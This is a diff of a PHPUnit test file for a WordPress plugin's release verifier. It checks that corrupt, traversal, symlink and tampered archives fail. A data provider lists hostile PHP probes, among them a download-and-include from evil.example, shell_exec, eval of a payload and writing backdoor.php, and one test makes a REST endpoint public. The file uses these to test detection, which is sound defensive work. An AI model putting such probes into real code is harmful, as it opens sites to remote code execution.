@@ -283,6 +283,7 @@ final class WporgArtifactPolicyTest extends TestCase {
 
 		$zip = $this->verify_mutated_zip( array( 'includes/policy-probe' => "runtime probe\n" ) );
 		$this->assertNotSame( 0, $zip['status'], $zip['output'] );
+		$this->assertStringContainsString( '[FAIL] extensionless executable:', $zip['output'] );
 	}
 
 	public function test_top_level_and_arbitrary_location_extensionless_source_files_are_rejected(): void {
@@ -312,21 +313,25 @@ final class WporgArtifactPolicyTest extends TestCase {
 		$probe = "<?php\n\$relay = 'relay-example.' /* static join */ . 'workers.dev';\n";
 		$zip = $this->verify_mutated_zip( array( 'assets/index.php' => $probe ) );
 		$this->assertNotSame( 0, $zip['status'], $zip['output'] );
+		$this->assertStringContainsString( '[FAIL] fixed external host:', $zip['output'] );
 	}
 
 	public function test_verifier_rejects_unexpected_runtime_file_and_map_drift(): void {
 		$extra = $this->verify_mutated_zip( array( 'includes/api/class-renamed-equivalent.php' => "<?php class Mcpwp_REST_Renamed_Equivalent {}\n" ) );
 		$this->assertNotSame( 0, $extra['status'], $extra['output'] );
+		$this->assertStringContainsString( '[FAIL] exclusive runtime inventory:', $extra['output'] );
 
 		$tool_source = (string) shell_exec( 'unzip -p ' . escapeshellarg( self::$zip_path ) . ' ' . escapeshellarg( 'mumega-mcp/includes/mcp/class-mcpwp-mcp-free-tools.php' ) );
-		$tool_drift  = str_replace( "'route' => '/site-info'", "'route' => '/site-details'", $tool_source );
+		$tool_drift  = str_replace( "'route'  => '/site-info'", "'route'  => '/site-details'", $tool_source );
 		$tool = $this->verify_mutated_zip( array( 'includes/mcp/class-mcpwp-mcp-free-tools.php' => $tool_drift ) );
 		$this->assertNotSame( 0, $tool['status'], $tool['output'] );
+		$this->assertStringContainsString( '[FAIL] exact MCP tool map:', $tool['output'] );
 
 		$route_source = (string) shell_exec( 'unzip -p ' . escapeshellarg( self::$zip_path ) . ' ' . escapeshellarg( 'mumega-mcp/includes/api/class-mcpwp-rest-site-info.php' ) );
 		$route_drift  = str_replace( "'/site-info'", "'/site-details'", $route_source );
 		$route = $this->verify_mutated_zip( array( 'includes/api/class-mcpwp-rest-site-info.php' => $route_drift ) );
 		$this->assertNotSame( 0, $route['status'], $route['output'] );
+		$this->assertStringContainsString( '[FAIL] exact REST route map:', $route['output'] );
 	}
 
 	public function test_verifier_rejects_mapless_advertised_tool(): void {
@@ -366,8 +371,8 @@ final class WporgArtifactPolicyTest extends TestCase {
 				$source
 			),
 			str_replace(
-				"\t\t\$tools = array();",
-				"\t\t\$descriptions = array_merge( \$descriptions, json_decode( '{\"wp_policy_probe\":\"Policy probe.\"}', true ) );\n\n\t\t\$tools = array();",
+				"\t\t\$tools     = array();",
+				"\t\t\$descriptions = array_merge( \$descriptions, json_decode( '{\"wp_policy_probe\":\"Policy probe.\"}', true ) );\n\n\t\t\$tools     = array();",
 				$source
 			),
 			$this->compose_tool_map_with_union( $source ),
@@ -393,8 +398,8 @@ final class WporgArtifactPolicyTest extends TestCase {
 				$source
 			),
 			str_replace(
-				"\t\t\$tools = array();",
-				"\t\t\$descriptions = array_merge( \$descriptions, json_decode( '{\"wp_policy_probe\":\"Policy probe.\"}', true ) );\n\n\t\t\$tools = array();",
+				"\t\t\$tools     = array();",
+				"\t\t\$descriptions = array_merge( \$descriptions, json_decode( '{\"wp_policy_probe\":\"Policy probe.\"}', true ) );\n\n\t\t\$tools     = array();",
 				$source
 			),
 			$this->compose_tool_map_with_union( $source ),
@@ -492,6 +497,145 @@ final class WporgArtifactPolicyTest extends TestCase {
 		$this->assertStringNotContainsString( 'MCPWP_WPORG_BUILD', (string) file_get_contents( self::$plugin_dir . '/mcpwp.php' ) );
 	}
 
+	public function test_verifier_reports_corrupt_and_empty_zip_diagnostics(): void {
+		$corrupt = $this->verify_standalone_archive( 'corrupt' );
+		$this->assertNotSame( 0, $corrupt['status'] );
+		$this->assertStringContainsString( '[FAIL] valid ZIP:', $corrupt['output'] );
+
+		$empty = $this->verify_standalone_archive( 'empty' );
+		$this->assertNotSame( 0, $empty['status'] );
+		$this->assertStringContainsString( '[FAIL] manifest: artifact is empty', $empty['output'] );
+	}
+
+	public function test_verifier_reports_duplicate_and_casefold_colliding_entries(): void {
+		$duplicate = $this->verify_archive_mutation(
+			"entries.append((copy.copy(entries[0][0]), entries[0][1]))"
+		);
+		$this->assertStringContainsString( '[FAIL] manifest uniqueness:', $duplicate['output'] );
+
+		$casefold = $this->verify_archive_mutation(
+			"source = next(item for item in entries if item[0].filename == 'mumega-mcp/assets/index.php')\n"
+			. "info = copy.copy(source[0])\n"
+			. "info.filename = 'mumega-mcp/aſſets/index.php'\n"
+			. "entries.append((info, source[1]))\n"
+			. "entries.sort(key=lambda item: item[0].filename.encode('utf-8'))"
+		);
+		$this->assertStringContainsString( '[FAIL] case-colliding entry:', $casefold['output'] );
+	}
+
+	public function test_verifier_reports_unsorted_and_unsafe_manifest_entries(): void {
+		$unsorted = $this->verify_archive_mutation( "entries[0], entries[1] = entries[1], entries[0]" );
+		$this->assertStringContainsString( '[FAIL] sorted manifest:', $unsorted['output'] );
+
+		foreach ( array( '/absolute.php', 'mumega-mcp\\backslash.php', 'mumega-mcp/../escape.php' ) as $unsafe_name ) {
+			$mutation = "info = zipfile.ZipInfo(" . var_export( $unsafe_name, true ) . ")\n"
+				. "info.create_system = 3\n"
+				. "info.external_attr = (stat.S_IFREG | 0o644) << 16\n"
+				. "entries.append((info, b'probe'))\n"
+				. "entries.sort(key=lambda item: item[0].filename.encode('utf-8'))";
+			$result = $this->verify_archive_mutation( $mutation );
+			$this->assertStringContainsString( '[FAIL] unsafe manifest path:', $result['output'], $unsafe_name );
+		}
+	}
+
+	public function test_verifier_reports_symlink_and_non_regular_entries(): void {
+		foreach ( array( 'symlink ZIP entry' => 'stat.S_IFLNK | 0o777', 'non-regular ZIP entry' => 'stat.S_IFIFO | 0o644' ) as $diagnostic => $mode ) {
+			$mutation = "index = next(i for i, item in enumerate(entries) if item[0].filename == 'mumega-mcp/assets/index.php')\n"
+				. "info = copy.copy(entries[index][0])\n"
+				. "info.create_system = 3\n"
+				. "info.external_attr = (" . $mode . ") << 16\n"
+				. "entries[index] = (info, b'../readme.txt')";
+			$result = $this->verify_archive_mutation( $mutation );
+			$this->assertStringContainsString( '[FAIL] ' . $diagnostic . ':', $result['output'] );
+		}
+	}
+
+	public function test_verifier_reports_root_main_and_version_identity_drift(): void {
+		$wrong_root = $this->verify_archive_mutation(
+			"for info, data in entries:\n    info.filename = info.filename.replace('mumega-mcp/', 'wrong-root/', 1)"
+		);
+		$this->assertStringContainsString( '[FAIL] single top-level root:', $wrong_root['output'] );
+
+		$additional_root = $this->verify_archive_mutation(
+			"info = zipfile.ZipInfo('second-root/probe.php')\n"
+			. "info.create_system = 3\n"
+			. "info.external_attr = (stat.S_IFREG | 0o644) << 16\n"
+			. "entries.append((info, b'<?php'))\n"
+			. "entries.sort(key=lambda item: item[0].filename.encode('utf-8'))"
+		);
+		$this->assertStringContainsString( '[FAIL] single top-level root:', $additional_root['output'] );
+
+		$wrong_main = $this->verify_archive_mutation(
+			"next(item for item in entries if item[0].filename == 'mumega-mcp/mumega-mcp.php')[0].filename = 'mumega-mcp/mcpwp.php'\n"
+			. "entries.sort(key=lambda item: item[0].filename.encode('utf-8'))"
+		);
+		$this->assertStringContainsString( '[FAIL] main file identity:', $wrong_main['output'] );
+
+		$version_file = $this->verify_archive_mutation(
+			"index = next(i for i, item in enumerate(entries) if item[0].filename == 'mumega-mcp/VERSION')\n"
+			. "entries[index] = (entries[index][0], b'9.9.9\\n')"
+		);
+		$this->assertStringContainsString( '[FAIL] version equality:', $version_file['output'] );
+	}
+
+	/** @dataProvider privateArchiveEntries */
+	public function test_verifier_reports_private_and_build_archive_entries( $relative, $diagnostic ): void {
+		$mutation = "info = zipfile.ZipInfo('mumega-mcp/' + " . var_export( $relative, true ) . ")\n"
+			. "info.create_system = 3\n"
+			. "info.external_attr = (stat.S_IFREG | 0o755) << 16\n"
+			. "entries.append((info, b'probe'))\n"
+			. "entries.sort(key=lambda item: item[0].filename.encode('utf-8'))";
+		$result = $this->verify_archive_mutation( $mutation );
+		$this->assertStringContainsString( '[FAIL] ' . $diagnostic . ':', $result['output'] );
+	}
+
+	public function privateArchiveEntries(): array {
+		return array(
+			'tests' => array( 'tests/probe.php', 'private path exclusion' ),
+			'vendor' => array( 'vendor/autoload.php', 'private path exclusion' ),
+			'scripts' => array( 'scripts/probe.sh', 'private path exclusion' ),
+			'archive' => array( 'release.zip', 'private/build file exclusion' ),
+			'build file' => array( 'composer.json', 'private/build file exclusion' ),
+			'extensionless executable' => array( 'includes/policy-probe', 'extensionless executable' ),
+		);
+	}
+
+	/** @dataProvider dangerousRuntimeProbes */
+	public function test_verifier_reports_dangerous_runtime_primitive( $probe, $diagnostic ): void {
+		$result = $this->verify_mutated_zip( array( 'assets/index.php' => "<?php\n" . $probe . "\n" ) );
+		$this->assertStringContainsString( '[FAIL] ' . $diagnostic . ':', $result['output'], $probe );
+	}
+
+	public function dangerousRuntimeProbes(): array {
+		return array(
+			'eval' => array( 'eval( $payload );', 'forbidden execution primitive' ),
+			'assert execution' => array( 'assert( $payload );', 'forbidden execution primitive' ),
+			'shell process' => array( "shell_exec( 'id' );", 'forbidden execution primitive' ),
+			'process pipe' => array( "proc_open( 'id', array(), \$pipes );", 'forbidden execution primitive' ),
+			'dynamic include' => array( 'include $downloaded_file;', 'forbidden execution primitive' ),
+			'download and run' => array( "include download_url( 'https://evil.example/payload.php' );", 'forbidden execution primitive' ),
+			'plugin package install' => array( 'new Plugin_Upgrader();', 'forbidden package operation' ),
+			'plugin package update' => array( 'wp_update_plugins();', 'forbidden package operation' ),
+			'plugin delete' => array( 'delete_plugins( array( $plugin ) );', 'forbidden package operation' ),
+			'arbitrary code writer' => array( "file_put_contents( ABSPATH . '/backdoor.php', \$payload );", 'forbidden arbitrary code writer' ),
+			'arbitrary CSS writer' => array( "file_put_contents( WP_CONTENT_DIR . '/custom.css', \$payload );", 'forbidden arbitrary code writer' ),
+			'arbitrary file handle' => array( "fopen( ABSPATH . '/policy-probe.php', 'w' );", 'forbidden arbitrary code writer' ),
+			'raw curl' => array( "curl_init( 'https://evil.example' );", 'forbidden outbound primitive' ),
+			'raw socket' => array( "fsockopen( 'evil.example', 443 );", 'forbidden outbound primitive' ),
+			'WordPress HTTP' => array( "wp_remote_get( 'https://evil.example' );", 'forbidden outbound primitive' ),
+			'comment-concatenated host' => array( "\$asset = 'https://evil.' /* join */ . 'example/payload.js';", 'fixed external host' ),
+		);
+	}
+
+	public function test_verifier_reports_public_rest_permission_callback_before_trusted_hash(): void {
+		$relative = 'includes/api/class-mcpwp-rest-posts.php';
+		$source = (string) shell_exec( 'unzip -p ' . escapeshellarg( self::$zip_path ) . ' ' . escapeshellarg( 'mumega-mcp/' . $relative ) );
+		$mutation = str_replace( "'check_create_post_permission'", "'__return_true'", $source );
+		$this->assertNotSame( $source, $mutation, 'Permission mutation fixture must alter the controller.' );
+		$result = $this->verify_mutated_zip( array( $relative => $mutation ) );
+		$this->assertStringContainsString( '[FAIL] public REST permission callback:', $result['output'] );
+	}
+
 	/** @return array{descriptions:string[],traits:string[],map:string[]} */
 	private function extract_structural_tool_inventory( $class_source, $trait_sources ): array {
 		$inventory = array( 'descriptions' => array(), 'traits' => array(), 'map' => array() );
@@ -559,12 +703,18 @@ final class WporgArtifactPolicyTest extends TestCase {
 		foreach ( $replacements as $relative => $contents ) {
 			$path = $temp . '/mumega-mcp/' . $relative;
 			if ( ! is_dir( dirname( $path ) ) ) { mkdir( dirname( $path ), 0777, true ); }
-			file_put_contents( $path, $contents );
+			$original = file_exists( $path ) ? file_get_contents( $path ) : null;
+			$this->assertNotSame( $original, $contents, 'Mutation fixture must alter ' . $relative );
+			$this->assertSame( strlen( $contents ), file_put_contents( $path, $contents ), 'Could not write mutation fixture: ' . $relative );
 		}
 		$zip = $temp . '/mumega-mcp-3.4.3.zip';
 		$command = 'cd ' . escapeshellarg( $temp ) . ' && find mumega-mcp -type f -print | LC_ALL=C sort | zip -q -X ' . escapeshellarg( $zip ) . ' -@';
 		exec( $command, $zip_output, $zip_status );
 		if ( 0 !== $zip_status ) { throw new RuntimeException( 'Could not build mutation fixture.' ); }
+		foreach ( $replacements as $relative => $contents ) {
+			$archived = shell_exec( 'unzip -p ' . escapeshellarg( $zip ) . ' ' . escapeshellarg( 'mumega-mcp/' . $relative ) );
+			$this->assertSame( $contents, $archived, 'Mutation fixture was not archived: ' . $relative );
+		}
 		exec( 'bash ' . escapeshellarg( self::$plugin_dir . '/scripts/verify-wporg-artifact.sh' ) . ' ' . escapeshellarg( $zip ) . ' 2>&1', $output, $status );
 		exec( 'rm -rf ' . escapeshellarg( $temp ) );
 		return array( 'status' => $status, 'output' => implode( "\n", $output ) );
@@ -581,6 +731,61 @@ final class WporgArtifactPolicyTest extends TestCase {
 			"\t\t);\n\t\t\$map += json_decode( '{\"wp_policy_probe\":{\"method\":\"GET\",\"route\":\"/site-info\"}}', true );\n\t\treturn \$map;\n\t}\n\n\tpublic function get_tool_categories()",
 			$source
 		);
+	}
+
+	/** @return array{status:int,output:string} */
+	private function verify_standalone_archive( $kind ): array {
+		$temp = sys_get_temp_dir() . '/mcpwp-standalone-' . bin2hex( random_bytes( 6 ) );
+		mkdir( $temp, 0700, true );
+		$zip = $temp . '/mumega-mcp-3.4.3.zip';
+		if ( 'empty' === $kind ) {
+			file_put_contents( $zip, "PK\x05\x06" . str_repeat( "\x00", 18 ) );
+		} else {
+			file_put_contents( $zip, "not a zip\n" );
+		}
+		$result = $this->verify_zip_path( $zip );
+		exec( 'rm -rf ' . escapeshellarg( $temp ) );
+		return $result;
+	}
+
+	/** @return array{status:int,output:string} */
+	private function verify_archive_mutation( $mutation ): array {
+		$temp = sys_get_temp_dir() . '/mcpwp-archive-' . bin2hex( random_bytes( 6 ) );
+		mkdir( $temp, 0700, true );
+		$zip = $temp . '/mumega-mcp-3.4.3.zip';
+		$script = $temp . '/mutate.py';
+		$python = <<<'PY'
+import copy
+import stat
+import sys
+import zipfile
+
+source_path, target_path = sys.argv[1:]
+with zipfile.ZipFile(source_path, "r") as source:
+    entries = [(copy.copy(info), source.read(info.filename)) for info in source.infolist()]
+
+before = [(info.filename, info.create_system, info.external_attr, data) for info, data in entries]
+__MUTATION__
+after = [(info.filename, info.create_system, info.external_attr, data) for info, data in entries]
+if before == after:
+    raise SystemExit("mutation fixture did not alter archive")
+
+with zipfile.ZipFile(target_path, "w") as target:
+    for info, data in entries:
+        target.writestr(info, data)
+PY;
+		file_put_contents( $script, str_replace( '__MUTATION__', $mutation, $python ) );
+		exec( 'python3 ' . escapeshellarg( $script ) . ' ' . escapeshellarg( self::$zip_path ) . ' ' . escapeshellarg( $zip ) . ' 2>&1', $fixture_output, $fixture_status );
+		$this->assertSame( 0, $fixture_status, implode( "\n", $fixture_output ) );
+		$result = $this->verify_zip_path( $zip );
+		exec( 'rm -rf ' . escapeshellarg( $temp ) );
+		return $result;
+	}
+
+	/** @return array{status:int,output:string} */
+	private function verify_zip_path( $zip ): array {
+		exec( 'bash ' . escapeshellarg( self::$plugin_dir . '/scripts/verify-wporg-artifact.sh' ) . ' ' . escapeshellarg( $zip ) . ' 2>&1', $output, $status );
+		return array( 'status' => $status, 'output' => implode( "\n", $output ) );
 	}
 
 	/** @return string[] */
